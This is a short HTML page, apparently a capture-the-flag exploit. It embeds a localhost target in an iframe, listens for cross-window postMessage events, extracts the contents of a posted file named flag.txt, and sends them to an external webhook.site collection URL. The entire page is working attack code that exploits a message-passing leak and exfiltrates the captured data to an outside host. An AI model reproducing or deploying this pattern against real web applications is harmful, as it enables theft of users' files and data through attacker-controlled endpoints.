<!DOCTYPE html>
<html>
<head><title>Parent Page</title></head>
<body>
  <iframe id="flagFrame" src="http://localhost:1338"></iframe>

  <script>
window.addEventListener("message", async (event) => {
  console.log("Message received:", event.data);

  // Check if 'files' array exists in the message data
  if (event.data && Array.isArray(event.data.files)) {
    const file = event.data.files.find(f => f.name === "flag.txt");

    if (file?.blob) {
      const text = await file.blob.text();
      console.log("FLAG:", text);

       fetch("https://webhook.site/e1c8db75-b5b5-47fd-a911-4a02b687c456/collect?flag=" + encodeURIComponent(text), {
        method: "GET",
         mode: "no-cors"
       });
    }
  }
});

  </script>
</body>
</html>
